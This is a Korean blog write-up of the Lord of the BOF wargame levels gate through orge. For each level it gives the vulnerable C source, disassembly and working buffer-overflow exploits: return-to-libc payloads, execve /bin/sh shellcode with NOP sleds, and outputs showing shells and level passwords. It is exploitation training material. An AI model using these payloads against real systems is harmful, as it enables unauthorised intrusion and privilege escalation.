---
layout: post
title:  "[LOB] gate-troll"
tag:   Analysis
categories: pwnable persu
modified: 2017-03-12
comments: true
featured: true
---

## gate

### 1. source code
### 2. gdb
### 3. exploit code



## gate

### 1. source code

```c
int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

### 2. gdb
```
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %ebp,%esp
0x8048433 <main+3>:	sub    %esp,0x100
0x8048439 <main+9>:	cmp    DWORD PTR [%ebp+8],1
0x804843d <main+13>:	jg     0x8048456 <main+38>
0x804843f <main+15>:	push   0x80484e0
0x8048444 <main+20>:	call   0x8048350 <printf>
0x8048449 <main+25>:	add    %esp,4
0x804844c <main+28>:	push   0
0x804844e <main+30>:	call   0x8048360 <exit>
0x8048453 <main+35>:	add    %esp,4
0x8048456 <main+38>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048459 <main+41>:	add    %eax,4
0x804845c <main+44>:	mov    %edx,DWORD PTR [%eax]
0x804845e <main+46>:	push   %edx
0x804845f <main+47>:	lea    %eax,[%ebp-256]
0x8048465 <main+53>:	push   %eax
0x8048466 <main+54>:	call   0x8048370 <strcpy>
0x804846b <main+59>:	add    %esp,8
0x804846e <main+62>:	lea    %eax,[%ebp-256]
0x8048474 <main+68>:	push   %eax
0x8048475 <main+69>:	push   0x80484ec
0x804847a <main+74>:	call   0x8048350 <printf>
0x804847f <main+79>:	add    %esp,8
0x8048482 <main+82>:	leave
0x8048483 <main+83>:	ret
```

### 3. exploit code
```
./gremlin `python -c 'print "A"*260+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"'`
bash$ my-pass
euid = 501
hello bof world
```
이번 취약점은 strcpy에 buf 길이 검증을 하지 않아 발생하는 BoF.
esp는 ebp-256에 위치하고 있기 때문에 SFP(4)까지 A 를 입력하고  RET 위치에 RLT를 이용하여 system함수를 넣게 된다. 이후 4byte dummy를 생성하고, 인자값인 /bin/sh를 넣게 된다.


## gremlin

### 1. source code

  ```c
int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

### 2. gdb
```asm
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %ebp,%esp
0x8048433 <main+3>:	sub    %esp,16
0x8048436 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:	jg     0x8048453 <main+35>
0x804843c <main+12>:	push   0x80484d0
; "argv error\n"
0x8048441 <main+17>:	call   0x8048350 <printf>
0x8048446 <main+22>:	add    %esp,4
0x8048449 <main+25>:	push   0
0x804844b <main+27>:	call   0x8048360 <exit>
0x8048450 <main+32>:	add    %esp,4
0x8048453 <main+35>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:	add    %eax,4
0x8048459 <main+41>:	mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:	push   %edx
0x804845c <main+44>:	lea    %eax,[%ebp-16]
0x804845f <main+47>:	push   %eax
0x8048460 <main+48>:	call   0x8048370 <strcpy>
0x8048465 <main+53>:	add    %esp,8
0x8048468 <main+56>:	lea    %eax,[%ebp-16]
0x804846b <main+59>:	push   %eax
; buffer
0x804846c <main+60>:	push   0x80484dc
; "%s\n"
0x8048471 <main+65>:	call   0x8048350 <printf>
0x8048476 <main+70>:	add    %esp,8
0x8048479 <main+73>:	leave
0x804847a <main+74>:	ret
```
### 3. exploit code
```
Starting program: /home/gremlin/test `python -c 'print "A"*22'`
AAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x804847a in main ()
(gdb) ni
0x40004141 in print_missing_version (errcode=Cannot access memory at address 0x41414149
) at rtld.c:1176
1176	rtld.c: No such file or directory.
(gdb) x/x $eip
0x40004141 <print_missing_version+53>:	0xcd9f838d
```
22개의 A 입력 시 eip에 2개가 들어가게 된다. 즉 24 byte까지 넣어야 하는데,
현재 왜 20 위치 부터 eip가 시작되는지 모르겠다.
-> 아 실수 ..... ebp-16 위치부터 buffer 값을 입력받는다.
0 - 16 까지 buffer
16 - 20 까지 SFP
20 - 24 까지 RET
이렇게 되는 구나


```exploit
./cobolt `python -c 'print "A"*20+"\xe0\x8a\x05\xAAA"+"\xf9\xbf\x0f\x40"'`
bash$ id

uid=501(gremlin) gid=501(gremlin) euid=502(cobolt) egid=502(cobolt)
groups=501(gremlin)

bash$ my-pass

euid = 502

hacking exposed
```


## cobolt

### 1. source code
```c
int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```
### 2. gdb
```asm
0x80483f8 <main>:	push   %ebp
0x80483f9 <main+1>:	mov    %ebp,%esp
0x80483fb <main+3>:	sub    %esp,16
0x80483fe <main+6>:	lea    %eax,[%ebp-16]
0x8048401 <main+9>:	push   %eax
0x8048402 <main+10>:	call   0x804830c <gets>
0x8048407 <main+15>:	add    %esp,4
0x804840a <main+18>:	lea    %eax,[%ebp-16]
0x804840d <main+21>:	push   %eax
0x804840e <main+22>:	push   0x8048470
0x8048413 <main+27>:	call   0x804833c <printf>
0x8048418 <main+32>:	add    %esp,8
0x804841b <main+35>:	leave
0x804841c <main+36>:	ret
0x804841d <main+37>:	nop
0x804841e <main+38>:	nop
0x804841f <main+39>:	nop
```

### 3. exploit code
```
(python -c 'print "A"*20+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"';cat)|./goblin

my-pass
euid = 503
hackers proof
```

## goblin

### 1. source code
```c
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```
소스 코드가 기존 보다 어려워졌다... 좀 분석을 하자면
egghunter이 등장하였는데 for와 memset을 이용해 environ을 0으로 초기화 한다.
이후 2차원 배열을 통해 argv [1][47] 값이 \xbf가 되야 한다. 입력 값이 48 번째 값이 \xbf가 되야 하나 보다...

결국 취약점이 터지는 부분은 strcpy(buffer, argv[1])에서 터지게 된다.
환경변수에 shell을 입력하고 참조하는 로직은 안된다는 점!
shell 코드를 제작하여, /bin/sh를 실행 시키도록 해야 한다.


### 2. gdb
```asm
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:	jg     0x8048523 <main+35>
0x804850c <main+12>:	push   0x8048630
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    %esp,4
0x8048519 <main+25>:	push   0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    %esp,4
0x8048523 <main+35>:	nop
0x8048524 <main+36>:	mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:	nop
0x804852c <main+44>:	lea    %esi,[%esi*1]
0x8048530 <main+48>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:	lea    %edx,[%eax*4]
0x804853a <main+58>:	mov    %eax,%ds:0x8049750
0x804853f <main+63>:	cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:	jne    0x8048547 <main+71>
0x8048545 <main+69>:	jmp    0x8048587 <main+135>
0x8048547 <main+71>:	mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:	lea    %edx,[%eax*4]
0x8048551 <main+81>:	mov    %eax,%ds:0x8049750
0x8048556 <main+86>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:	push   %edx
0x804855a <main+90>:	call   0x80483f0 <strlen>
0x804855f <main+95>:	add    %esp,4
0x8048562 <main+98>:	mov    %eax,%eax
0x8048564 <main+100>:	push   %eax
0x8048565 <main+101>:	push   0
0x8048567 <main+103>:	mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:	lea    %edx,[%eax*4]
0x8048571 <main+113>:	mov    %eax,%ds:0x8049750
0x8048576 <main+118>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:	push   %edx
0x804857a <main+122>:	call   0x8048430 <memset>
0x804857f <main+127>:	add    %esp,12
0x8048582 <main+130>:	inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:	jmp    0x8048530 <main+48>
0x8048587 <main+135>:	mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:	add    %eax,4
0x804858d <main+141>:	mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:	add    %edx,47
0x8048592 <main+146>:	cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:	je     0x80485b0 <main+176>
0x8048597 <main+151>:	push   0x804863c
0x804859c <main+156>:	call   0x8048410 <printf>
0x80485a1 <main+161>:	add    %esp,4
0x80485a4 <main+164>:	push   0
0x80485a6 <main+166>:	call   0x8048420 <exit>
0x80485ab <main+171>:	add    %esp,4
0x80485ae <main+174>:	mov    %esi,%esi
0x80485b0 <main+176>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:	add    %eax,4
0x80485b6 <main+182>:	mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:	push   %edx
0x80485b9 <main+185>:	lea    %eax,[%ebp-40]
0x80485bc <main+188>:	push   %eax
0x80485bd <main+189>:	call   0x8048440 <strcpy>
0x80485c2 <main+194>:	add    %esp,8
0x80485c5 <main+197>:	lea    %eax,[%ebp-40]
0x80485c8 <main+200>:	push   %eax
0x80485c9 <main+201>:	push   0x8048659
0x80485ce <main+206>:	call   0x8048410 <printf>
0x80485d3 <main+211>:	add    %esp,8
0x80485d6 <main+214>:	leave
0x80485d7 <main+215>:	ret
0x80485d8 <main+216>:	nop
0x80485d9 <main+217>:	nop
0x80485da <main+218>:	nop
0x80485db <main+219>:	nop
0x80485dc <main+220>:	nop
0x80485dd <main+221>:	nop
0x80485de <main+222>:	nop
0x80485df <main+223>:	nop
```

### 3. exploit code

```
(gdb) r `python -c "print 'A'*40+'BBBB'+'\xbf\xbf\xbf\xbf'"`
Starting program: /tmp/orc `python -c "print 'A'*40+'BBBB'+'\xbf\xbf\xbf\xbf'"`

Breakpoint 1, 0x80485c5 in main ()
(gdb) x/20wx $esp
0xbffffc8c:	0x00000015	0x41414141	0x41414141	0x41414141
0xbffffc9c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcac:	0x41414141	0x41414141	0x41414141	0x42424242
0xbffffcbc:	0xbfbfbfbf	0x00000000	0xbffffd04	0xbffffd10
0xbffffccc:	0x40013868	0x00000002	0x08048450	0x00000000
(gdb) x/x 0xbffffc90
0xbffffc90:	0x41414141
```

shell 코드를 실행 시키기 위해서는 buffer의 시작점을 알아야 한다. 위와 같이 충분히 stack을 덮어 쓰고 어디부터 A를 덮어 쓰는지 확인헤야 한다.

여기서는 0xbffffc8c + 4 = 0xbffffc90

- 25byte shell
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```

exploit payload 는

shellcode : 25 byte
NOP       : 15 byte
SFP       : 4 byte
RET       : 4 byte (0xbffffc90)

위와 같이 exploit payload 를 짜보자!

```
`python -c "print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*19+"\x90\xfc\xff\xbf"`

bash$ my-pass
euid = 504
cantata
```

오오 됨!!
## orc

### 1. source code
```
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}
	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```
### 2. gdb

```asm
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:	jg     0x8048523 <main+35>
0x804850c <main+12>:	push   0x8048640
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    %esp,4
0x8048519 <main+25>:	push   0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    %esp,4
0x8048523 <main+35>:	nop
0x8048524 <main+36>:	mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:	nop
0x804852c <main+44>:	lea    %esi,[%esi*1]
0x8048530 <main+48>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:	lea    %edx,[%eax*4]
0x804853a <main+58>:	mov    %eax,%ds:0x8049760
0x804853f <main+63>:	cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:	jne    0x8048547 <main+71>
0x8048545 <main+69>:	jmp    0x8048587 <main+135>
0x8048547 <main+71>:	mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:	lea    %edx,[%eax*4]
0x8048551 <main+81>:	mov    %eax,%ds:0x8049760
0x8048556 <main+86>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:	push   %edx
0x804855a <main+90>:	call   0x80483f0 <strlen>
0x804855f <main+95>:	add    %esp,4
0x8048562 <main+98>:	mov    %eax,%eax
0x8048564 <main+100>:	push   %eax
0x8048565 <main+101>:	push   0
0x8048567 <main+103>:	mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:	lea    %edx,[%eax*4]
0x8048571 <main+113>:	mov    %eax,%ds:0x8049760
0x8048576 <main+118>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:	push   %edx
0x804857a <main+122>:	call   0x8048430 <memset>
0x804857f <main+127>:	add    %esp,12
0x8048582 <main+130>:	inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:	jmp    0x8048530 <main+48>
0x8048587 <main+135>:	mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:	add    %eax,4
0x804858d <main+141>:	mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:	add    %edx,47
0x8048592 <main+146>:	cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:	je     0x80485b0 <main+176>
0x8048597 <main+151>:	push   0x804864c
0x804859c <main+156>:	call   0x8048410 <printf>
0x80485a1 <main+161>:	add    %esp,4
0x80485a4 <main+164>:	push   0
0x80485a6 <main+166>:	call   0x8048420 <exit>
0x80485ab <main+171>:	add    %esp,4
0x80485ae <main+174>:	mov    %esi,%esi
0x80485b0 <main+176>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:	add    %eax,4
0x80485b6 <main+182>:	mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:	push   %edx
0x80485b9 <main+185>:	lea    %eax,[%ebp-40]
0x80485bc <main+188>:	push   %eax
0x80485bd <main+189>:	call   0x8048440 <strcpy>
0x80485c2 <main+194>:	add    %esp,8
0x80485c5 <main+197>:	lea    %eax,[%ebp-40]
0x80485c8 <main+200>:	push   %eax
0x80485c9 <main+201>:	push   0x8048669
0x80485ce <main+206>:	call   0x8048410 <printf>
0x80485d3 <main+211>:	add    %esp,8
0x80485d6 <main+214>:	push   40
0x80485d8 <main+216>:	push   0
0x80485da <main+218>:	lea    %eax,[%ebp-40]
0x80485dd <main+221>:	push   %eax
0x80485de <main+222>:	call   0x8048430 <memset>
0x80485e3 <main+227>:	add    %esp,12
0x80485e6 <main+230>:	leave
0x80485e7 <main+231>:	ret
0x80485e8 <main+232>:	nop
0x80485e9 <main+233>:	nop
0x80485ea <main+234>:	nop
0x80485eb <main+235>:	nop
0x80485ec <main+236>:	nop
0x80485ed <main+237>:	nop
0x80485ee <main+238>:	nop
0x80485ef <main+239>:	nop
```
### 3. exploit code
이 문제를 풀기 위해 생각한 방법은
buffer    : 40 byte
SFP       : 4 byte
RET       : 4 byte

이런 스택 구조에서 RET 다음에 쉘 코드를 넣고, RET(eip)를 RET+4byte로 지정하면 될 것이라 생각했다.....
삽질 결과 위 방식은 되지 않고 중요한 사실을 알게 되었다....

```
(gdb) ni
0x80485e3 in main ()
(gdb) x/20wx $esp
0xbffffc90:	0xbffffca0	0x00000000	0x00000028	0x00000015
0xbffffca0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffcb0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffcc0:	0x00000000	0x00000000	0x42424242	0xbfbfbfbf
0xbffffcd0:	0x00000000	0xbffffd14	0xbffffd20	0x40013868
```
ni 10 번 정도 실행하면 입력하였던 값이 buffer hunter로 인해 0으로 변환되버린다.
흠 여기서 좀더 스택 구조를 살펴 보도록 하자....

x/20wx $esp 를 계속하다보면

```
0xbffffdd0:	0x00000010	0x0fabfbff	0x0000000f	0xbffffe05
0xbffffde0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffdf0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffe00:	0x00000000	0x38366900	0x742f0036	0x772f706d
0xbffffe10:	0x00666c6f	0x41414141	0x41414141	0x41414141
0xbffffe20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffe30:	0x41414141	0x41414141	0x41414141	0x42424242
0xbffffe40:	0xbfbfbfbf	0x00000000	0x00000000	0x00000000
0xbffffe50:	0x00000000	0x00000000	0x00000000	0x00000000
```
입력하였던 값이 다시 노출된다. 정확한 위치는 .... 0xbffffe10 + 4 = 0xbffffe14
이 값은 argv[1]의 주소로 프로그램이 종료가 될때까지 stack에 남아 있다.
위에서 buffer가 0으로 초기화되어도 argv[1]의 주소로 이동하게 되면 shell을 실행할 수 있게 된다는 것이다.

exploit payload는 아래와 같다

```
./wolfman `python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'+'\x90'*19+'\x14\xfe\xff\xbf'"`

1�Ph//shh/bin��PS��1Ұ
                      ̀����������������������
Segmentation fault
```
위 payload 를 입력하면 그림 좋게 segment fault가 뜨게 된다....

또 삽질 시작....
결국 wolfman을 /tmp 디렉토리에 복사하여 소스코드에 argv의 real address를 출력하는 코드를 삽입하였다.

```c
// buffer hunter
memset(buffer, 0, 40);
printf("%#x\n",argv[1]);
```

오류 발생 시 argv의 정확한 주소를 파악 할 수 있다.

```
tmp/wolf `python -c "print 'A'*40 + 'BBBB' + '\xbf\xbf\xbf\xbf'"`
0xbffffe08
Segmentation fault (core dumped)
```

최종 exploit payload는 아래와 같다

```
./wolfman `python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'+'\x90'*19+'\x08\xfe\xff\xbf'"`
bash$ my-pass
euid = 505
love eyuna
```

## wolfman

### 1. source code
```
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

음 이번에는 argv의 길이값 검증까지 추가 되었다...
이 문제를 풀기위해서는 48byte로만 exploit payload를 구성해야 되는데 이미 그렇게 구성하고 있기 때문에 .... 별 무리 없이 패스 할 수 있었다....

### 2. gdb
첨부하지 않음
### 3. exploit code
```
./darkelf `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*19+"\xec\xfd\xff\xbf"'`
bash$ my-pass
euid = 506
kernel crashed
```

## darkelf

### 1. source code
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// here is changed!
	if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

### 2. gdb
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:	jg     0x8048523 <main+35>
0x804850c <main+12>:	push   0x8048690
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    %esp,4
0x8048519 <main+25>:	push   0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    %esp,4
0x8048523 <main+35>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048526 <main+38>:	mov    %edx,DWORD PTR [%eax]
0x8048528 <main+40>:	push   %edx
0x8048529 <main+41>:	call   0x80483f0 <strlen>
0x804852e <main+46>:	add    %esp,4
0x8048531 <main+49>:	mov    %eax,%eax
0x8048533 <main+51>:	cmp    %eax,77
0x8048536 <main+54>:	je     0x8048550 <main+80>
0x8048538 <main+56>:	push   0x804869c
0x804853d <main+61>:	call   0x8048410 <printf>
0x8048542 <main+66>:	add    %esp,4
0x8048545 <main+69>:	push   0
0x8048547 <main+71>:	call   0x8048420 <exit>
0x804854c <main+76>:	add    %esp,4
0x804854f <main+79>:	nop
0x8048550 <main+80>:	nop
0x8048551 <main+81>:	mov    DWORD PTR [%ebp-44],0x0
0x8048558 <main+88>:	mov    %eax,DWORD PTR [%ebp-44]
0x804855b <main+91>:	lea    %edx,[%eax*4]
0x8048562 <main+98>:	mov    %eax,%ds:0x80497d4
0x8048567 <main+103>:	cmp    DWORD PTR [%eax+%edx],0
0x804856b <main+107>:	jne    0x8048570 <main+112>
0x804856d <main+109>:	jmp    0x80485b0 <main+176>
0x804856f <main+111>:	nop
0x8048570 <main+112>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048573 <main+115>:	lea    %edx,[%eax*4]
0x804857a <main+122>:	mov    %eax,%ds:0x80497d4
0x804857f <main+127>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048582 <main+130>:	push   %edx
0x8048583 <main+131>:	call   0x80483f0 <strlen>
0x8048588 <main+136>:	add    %esp,4
0x804858b <main+139>:	mov    %eax,%eax
0x804858d <main+141>:	push   %eax
0x804858e <main+142>:	push   0
0x8048590 <main+144>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048593 <main+147>:	lea    %edx,[%eax*4]
0x804859a <main+154>:	mov    %eax,%ds:0x80497d4
0x804859f <main+159>:	mov    %edx,DWORD PTR [%eax+%edx]
0x80485a2 <main+162>:	push   %edx
0x80485a3 <main+163>:	call   0x8048430 <memset>
0x80485a8 <main+168>:	add    %esp,12
0x80485ab <main+171>:	inc    DWORD PTR [%ebp-44]
0x80485ae <main+174>:	jmp    0x8048558 <main+88>
0x80485b0 <main+176>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:	add    %eax,4
0x80485b6 <main+182>:	mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:	add    %edx,47
0x80485bb <main+187>:	cmp    BYTE PTR [%edx],0xbf
0x80485be <main+190>:	je     0x80485d7 <main+215>
0x80485c0 <main+192>:	push   0x80486ab
0x80485c5 <main+197>:	call   0x8048410 <printf>
0x80485ca <main+202>:	add    %esp,4
0x80485cd <main+205>:	push   0
0x80485cf <main+207>:	call   0x8048420 <exit>
0x80485d4 <main+212>:	add    %esp,4
0x80485d7 <main+215>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485da <main+218>:	add    %eax,4
0x80485dd <main+221>:	mov    %edx,DWORD PTR [%eax]
0x80485df <main+223>:	push   %edx
0x80485e0 <main+224>:	call   0x80483f0 <strlen>
0x80485e5 <main+229>:	add    %esp,4
0x80485e8 <main+232>:	mov    %eax,%eax
0x80485ea <main+234>:	cmp    %eax,48
0x80485ed <main+237>:	jbe    0x8048606 <main+262>
0x80485ef <main+239>:	push   0x80486c8
0x80485f4 <main+244>:	call   0x8048410 <printf>
0x80485f9 <main+249>:	add    %esp,4
0x80485fc <main+252>:	push   0
0x80485fe <main+254>:	call   0x8048420 <exit>
0x8048603 <main+259>:	add    %esp,4
0x8048606 <main+262>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048609 <main+265>:	add    %eax,4
0x804860c <main+268>:	mov    %edx,DWORD PTR [%eax]
0x804860e <main+270>:	push   %edx
0x804860f <main+271>:	lea    %eax,[%ebp-40]
0x8048612 <main+274>:	push   %eax
0x8048613 <main+275>:	call   0x8048440 <strcpy>
0x8048618 <main+280>:	add    %esp,8
0x804861b <main+283>:	lea    %eax,[%ebp-40]
0x804861e <main+286>:	push   %eax
0x804861f <main+287>:	push   0x80486df
0x8048624 <main+292>:	call   0x8048410 <printf>
0x8048629 <main+297>:	add    %esp,8
0x804862c <main+300>:	push   40
0x804862e <main+302>:	push   0
0x8048630 <main+304>:	lea    %eax,[%ebp-40]
0x8048633 <main+307>:	push   %eax
0x8048634 <main+308>:	call   0x8048430 <memset>
0x8048639 <main+313>:	add    %esp,12
0x804863c <main+316>:	leave
0x804863d <main+317>:	ret
0x804863e <main+318>:	nop
0x804863f <main+319>:	nop

### 3. exploit code
argv 0 에 길이가 77이 되야 하는 조건이 붙는다. 그렇다면 argv 0 은 도대체 무엇일까?
참조 : http://lafirr.tistory.com/12
위 사이트를 참고한 결과 실행할 바이너리를 뜻한다. 즉 ./orge test 라는 명령어를 쉘에서 입력 시
./orge가 argv 0 이되며, test 가 argv 1 이되는 것이다. ./orge의 길이를 77만큼 만들어야 하는데...

```
[darkelf@localhost darkelf]$ ////////////////////bin/ls
orge  orge.c
```

이런 방식처럼 ////를 많이 입력하여도 하나의 / 로 받아들이기 때문에 / 를 통해 문자열 길이를 조정하면 될 것 같다.
```
[darkelf@localhost darkelf]$ `python -c 'print "."+"/"*72+"orge"'`
argv error
[darkelf@localhost darkelf]$ `python -c 'print "."+"/"*72+"orge "'`a
stack is still your friend.
```

최종으로 생각한 exploit payload는 아래와 같다.

```
 `python -c 'print "."+"/"*72+"orge "+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*19+"\xec\xfd\xff\xbf"'`

 <\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*19+"\xec\xfd\xff\xbf"'`
 1�Ph//shh/bin��PS��1Ұ
                       ̀�����������������������
 0xbffffd64
 Segmentation fault (core dumped)
```
이런... segmentation fault가 떴다.... 페이로드를 다시 짜면, argv2의 메모리 주소를 위 풀이 처럼 다시 확인 결과 아래와 같은 페이로드를 짤 수 있었다.

```
 `python -c 'print "."+"/"*72+"orge "+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*19+"\x64\xfd\xff\xbf"'`

 bash$ my-pass
 euid = 507
 timewalker
```

## orge

### 1. source code
```
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	// here is changed
	if(argc != 2){
		printf("argc must be two!\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// one more!
	memset(argv[1], 0, strlen(argv[1]));
}
```

소스 코드를 분석해보면,
### 2. gdb

```
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],2
0x804850a <main+10>:	je     0x8048523 <main+35>
0x804850c <main+12>:	push   0x8048690
0x8048511 <main+17>:	call   0x8048410 <printf>
